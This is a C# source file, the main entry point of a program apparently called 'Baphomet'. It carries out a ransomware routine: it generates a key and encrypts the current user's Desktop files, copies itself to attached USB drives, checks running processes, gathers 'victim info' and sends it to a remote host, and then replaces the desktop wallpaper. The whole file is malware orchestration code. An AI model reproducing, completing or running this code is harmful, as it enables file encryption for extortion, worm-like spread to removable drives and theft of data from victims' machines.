using System;
using System.Collections.Generic;
using System.IO;
using Baphomet.Models;
using Baphomet.Utilities;

namespace Baphomet;

public class Program
{
	private static void Main()
	{
		Cryptep cryptep = new Cryptep();
		BackgroundPhoto backgroundPhoto = new BackgroundPhoto();
		NetInfo netInfo = new NetInfo();
		Diagnostics diagnostics = new Diagnostics();
		string key = cryptep.GenerateKey();
		string userName = Environment.UserName;
		string[] array = new string[1] { "Desktop" };
		string text = Path.Combine("C:\\Users\\", userName);
		List<UsbDeviceDTO> usbDevices = diagnostics.GetUsbDevices();
		if (usbDevices.Count != 0)
		{
			diagnostics.AutoCopy(usbDevices);
		}
		diagnostics.CheckProccess();
		for (int i = 0; i < array.Length; i++)
		{
			string targetPath = Path.Combine(text, array[i]);
			cryptep.directoryRoad(targetPath, key);
		}
		if (netInfo.CheckInternetConnection())
		{
			VictimInfoDTO victimInfo = netInfo.GetVictimInfo();
			string text2 = netInfo.HostName();
			if (text2 != "noLive")
			{
				netInfo.SendData(victimInfo, text2);
			}
		}
		string imagebase = backgroundPhoto.imageBase64();
		backgroundPhoto.ChangeWallpaper(imagebase, text);
	}
}
